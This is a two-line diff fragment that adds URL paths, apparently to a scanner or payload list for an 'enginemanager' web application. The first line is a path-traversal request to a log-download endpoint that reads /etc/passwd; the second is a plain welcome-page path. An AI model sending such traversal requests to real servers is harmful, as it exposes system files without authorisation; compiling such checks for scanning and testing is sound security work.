@@ -1,0 +1,2 @@
+/enginemanager/server/logs/download?logType=error&logName=../../../../../../../../etc/passwd&logSource=engine
+/enginemanager/ftu/welcome.htm
